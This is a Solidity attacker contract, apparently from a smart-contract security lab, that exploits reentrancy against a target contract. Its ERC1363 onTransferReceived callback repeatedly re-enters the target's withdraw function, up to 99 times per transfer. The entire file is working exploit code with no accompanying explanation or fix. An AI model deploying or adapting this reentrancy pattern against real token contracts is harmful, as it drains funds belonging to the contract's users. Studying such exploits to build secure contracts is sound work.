// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {IERC1363Receiver} from "erc-payable-token/contracts/token/ERC1363/IERC1363Receiver.sol";
import {IVulnerableContract} from "./IVulnerableContract.sol";

contract AttackerContract is IERC1363Receiver {
    uint256 timesCalled;

    constructor(address _vulnerableContract) {
        IVulnerableContract vulnerableContract = IVulnerableContract(
            _vulnerableContract
        );
        vulnerableContract.freeInitialMint();
    }

    function depositTokensToVulnerableContract(
        address _vulnerableContract,
        uint256 _amount
    ) external {
        IVulnerableContract vulnerableContract = IVulnerableContract(
            _vulnerableContract
        );
        vulnerableContract.transferAndCall(_vulnerableContract, _amount);
    }

    function withdrawTokensFromVulnerableContract(
        address _vulnerableContract
    ) external {
        IVulnerableContract vulnerableContract = IVulnerableContract(
            _vulnerableContract
        );
        vulnerableContract.reentrancyAttackWithdrawTokens();
    }

    function onTransferReceived(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        IVulnerableContract vulnerableContract = IVulnerableContract(
            msg.sender
        );
        timesCalled += 1;
        if (timesCalled < 100) {
            vulnerableContract.reentrancyAttackWithdrawTokens();
        }
        return
            bytes4(
                keccak256("onTransferReceived(address,address,uint256,bytes)")
            );
    }
}
